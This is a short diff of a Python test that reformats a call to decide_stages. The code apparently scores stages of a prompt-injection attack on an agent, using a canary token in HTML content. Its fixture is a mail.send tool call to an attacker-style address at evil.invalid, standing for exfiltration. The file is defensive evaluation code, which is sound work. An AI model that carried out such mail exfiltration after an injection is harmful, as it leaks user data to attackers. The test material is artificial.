@@ -14,8 +14,14 @@ def test_no_attack_reaches_no_stage():
 
 def test_stages_follow_the_canary():
     call = ToolCall("mail.send", {"to": "a-CNRX@evil.invalid"})
-    stages = decide_stages("CNRX", "mail.send", ["<p>CNRX</p>"], ["CNRX"], [call],
-                           [{"tool": "mail.send", "arguments": call.arguments}])
+    stages = decide_stages(
+        "CNRX",
+        "mail.send",
+        ["<p>CNRX</p>"],
+        ["CNRX"],
+        [call],
+        [{"tool": "mail.send", "arguments": call.arguments}],
+    )
     assert stages == Stages(True, True, True, True)
 
 
